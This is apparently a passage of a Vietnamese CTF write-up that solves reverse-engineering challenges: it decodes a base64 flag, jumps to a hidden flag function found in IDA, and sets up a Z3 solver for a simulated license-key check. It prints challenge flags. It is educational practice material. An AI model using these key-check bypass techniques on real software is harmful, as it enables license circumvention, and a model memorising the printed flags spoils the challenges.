        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">scrambled</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
            <span class="k">continue</span>
        <span class="n">scrambled</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">scrambled</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">secret_flag</span> <span class="o">=</span> <span class="nf">scramble_flag</span><span class="p">(</span><span class="nf">reverse_string</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="sh">'</span><span class="s">Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==</span><span class="sh">'</span><span class="p">)).</span><span class="nf">decode</span><span class="p">())</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Welcome to PyReverser!</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Please enter a word or phrase:</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">user_input</span> <span class="o">=</span> <span class="nf">input</span><span class="p">()</span>
    <span class="n">generated_value</span> <span class="o">=</span> <span class="nf">scramble_flag</span><span class="p">(</span><span class="nf">reverse_string</span><span class="p">(</span><span class="n">user_input</span><span class="p">.</span><span class="nf">upper</span><span class="p">()))</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Generated value:</span><span class="sh">'</span><span class="p">,</span> <span class="n">generated_value</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Can you find the hidden flag?</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">reversed_flag</span> <span class="o">=</span> <span class="nf">reverse_string</span><span class="p">(</span><span class="n">secret_flag</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Reversed flag:</span><span class="sh">'</span><span class="p">,</span> <span class="n">reversed_flag</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
    <span class="c1"># return None
</span></code></pre></div></div>

<p>Dễ dàng decode base64 đoạn mã <code class="language-plaintext highlighter-rouge">Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==</code>, chúng ta sẽ có được flag.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==</span><span class="dl">"</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">Flag: CHH{python2Exi_Reverse_ENginering}</span><span class="dl">'</span>
</code></pre></div></div>

<p><strong>Flag: CHH{python2Exi_Reverse_ENginering}</strong></p>
<h3 id="jump">
  
  
    Jump <a href="#jump">#</a>
  
  
</h3>
    

<p><strong>Description</strong></p>

<p>Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1nCOaD5emAyAqQmJrhB8hlu4UdCbBmRuH/view?usp=drive_link">Jump</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Bài toán cho chúng ta một file <code class="language-plaintext highlighter-rouge">jump.exe</code>. Bỏ file này vào <code class="language-plaintext highlighter-rouge">IDAPRO 32</code>, chúng ta thấy được đoạn mã giả của hàm <code class="language-plaintext highlighter-rouge">main</code>.</p>

<p><img src="/images/cookiehanhoan2023/image-10.png" alt="Alt text" /></p>

<p>Nhiệm vụ của hàm <code class="language-plaintext highlighter-rouge">main</code> là cho nhập giá trị vào biến <code class="language-plaintext highlighter-rouge">jump</code> rồi nhảy đến địa chỉ đó. Vì vậy, chúng ta chỉ cần nhảy đến địa chỉ hàm <code class="language-plaintext highlighter-rouge">_flag</code> là có thể lấy được flag.</p>

<p>Lưu ý: <strong>0x00401500 = 4199680</strong></p>

<p><img src="/images/cookiehanhoan2023/image-11.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{JUMP_T0_TH3_M00N}</strong></p>
<h3 id="rev1">
  
  
    Rev1 <a href="#rev1">#</a>
  
  
</h3>
    

<p><strong>Description</strong></p>

<p>Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1rzlX1TX4J8XDBuSUj3s8EtErXCOeKKVj/view?usp=sharing">Rev1</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Bài này mình không biết debug nên mình lấy luôn code của các bạn đã writeup.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debug055:02760002 movzx   eax, byte ptr [edi+ecx]
debug055:02760006 imul    eax, 6Eh ; 'n'
debug055:02760009 inc     ecx
debug055:0276000A movzx   edx, byte ptr [edi+ecx]
debug055:0276000E imul    edx, 1C3h
debug055:02760014 add     eax, edx
debug055:02760016 inc     ecx
debug055:02760017 movzx   edx, byte ptr [edi+ecx]
debug055:0276001B imul    edx, 348h
debug055:02760021 add     eax, edx
debug055:02760023 inc     ecx
debug055:02760024 movzx   edx, byte ptr [edi+ecx]
debug055:02760028 imul    edx, 1F8h
debug055:0276002E add     eax, edx
debug055:02760030 inc     ecx
debug055:02760031 movzx   edx, byte ptr [edi+ecx]
debug055:02760035 imul    edx, 357h
debug055:0276003B sub     eax, edx
debug055:0276003D inc     ecx
debug055:0276003E movzx   edx, byte ptr [edi+ecx]
debug055:02760042 imul    edx, 46h ; 'F'
debug055:02760045 add     eax, edx
debug055:02760047 inc     ecx
debug055:02760048 movzx   edx, byte ptr [edi+ecx]
debug055:0276004C imul    edx, 16Fh
debug055:02760052 sub     eax, edx
debug055:02760054 inc     ecx
debug055:02760055 movzx   edx, byte ptr [edi+ecx]
debug055:02760059 imul    edx, 2FEh
debug055:0276005F sub     eax, edx
debug055:02760061 inc     ecx
debug055:02760062 movzx   edx, byte ptr [edi+ecx]
debug055:02760066 imul    edx, 17Ah
debug055:0276006C add     eax, edx
debug055:0276006E inc     ecx
debug055:0276006F movzx   edx, byte ptr [edi+ecx]
debug055:02760073 imul    edx, 15Ah
debug055:02760079 add     eax, edx
debug055:0276007B inc     ecx
debug055:0276007C movzx   edx, byte ptr [edi+ecx]
debug055:02760080 imul    edx, 326h
debug055:02760086 sub     eax, edx
debug055:02760088 inc     ecx
debug055:02760089 movzx   edx, byte ptr [edi+ecx]
debug055:0276008D imul    edx, 190h
debug055:02760093 sub     eax, edx
debug055:02760095 inc     ecx
debug055:02760096 movzx   edx, byte ptr [edi+ecx]
debug055:0276009A imul    edx, 129h
debug055:027600A0 add     eax, edx
debug055:027600A2 inc     ecx
debug055:027600A3 movzx   edx, byte ptr [edi+ecx]
debug055:027600A7 imul    edx, 2EDh
debug055:027600AD add     eax, edx
debug055:027600AF inc     ecx
debug055:027600B0 movzx   edx, byte ptr [edi+ecx]
debug055:027600B4 cmp     eax, 29CBh
</code></pre></div></div>

<p>Đến đây, bài toán đưa về việc giải hệ phương trình 14 phương trình, 14 ẩn. Để giải hệ phương trình này, các bạn có thể giải tay bằng những kiến thức đã được học trong môn ĐSTT haha.</p>

<p>Còn mình sẽ sử dụng Z3 để giải quyết bài toán này.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">z3</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">solver</span> <span class="o">=</span> <span class="nc">Solver</span><span class="p">()</span>

<span class="n">v</span> <span class="o">=</span> <span class="p">[</span><span class="nc">BitVec</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">x</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="p">)]</span>

<span class="n">equations</span> <span class="o">=</span> <span class="p">[</span>
    <span class="mh">0x6E</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1C3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x348</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1F8</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x357</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x46</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x16F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2FE</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x17A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x15A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x326</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x190</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x129</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2ED</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x29CB</span><span class="p">,</span>
    <span class="mh">0x2A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3B2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2C1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x23A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3D1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x152</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x221</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2FC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0DF</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x36F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1A2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x179</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x284</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x64</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0F0ED</span><span class="p">,</span>
    <span class="mh">0x328</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3CD</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3CC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x329</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0EA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x12B</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2E</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x337</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x262</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x37</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0A4</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x383</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2D5</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x66098</span><span class="p">,</span>
    <span class="mh">0x66</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3C9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0C0</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0BD</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x9D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2D1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x299</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x38E</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x15</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x14E</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x280</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0E1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x128</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x50</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x6CE4</span><span class="p">,</span>
    <span class="mh">0x2ED</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x8A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x155</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x8C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x239</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x259</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x286</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1DA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x154</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x196</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x97</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x26D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3E0</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1EB</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x150DD</span><span class="p">,</span>
    <span class="mh">0x46</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2DF</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x243</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x78</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0EE</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x99</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0C5</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0EB</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0AE</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x28F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x65</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x20B</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x147</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3C2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x1E68B</span><span class="p">,</span>
    <span class="mh">0x264</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2BE</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3B5</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1D3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x8</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x150</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3C1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3E4</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x58</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x19C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3AA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x261</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x17F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x167</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x18490</span><span class="p">,</span>
    <span class="mh">0x0B3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x63</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0E0</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x24</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x37C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0AA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x33</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x11E</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x13D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x139</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3DC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x14C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2DD</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2B3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x3CC54</span><span class="p">,</span>
    <span class="mh">0x102</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x115</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0D3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0DC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3A1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x35C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0ED</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x141</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x19C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2B6</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3CC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3AA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x24B</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1B9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x45670</span><span class="p">,</span>
    <span class="mh">0x3C4</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x305</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0A9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x87</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0E6</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x30</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x20F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3D0</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x94</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2CC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x56</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x224</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1B5</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x183</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x21A0F</span><span class="p">,</span>
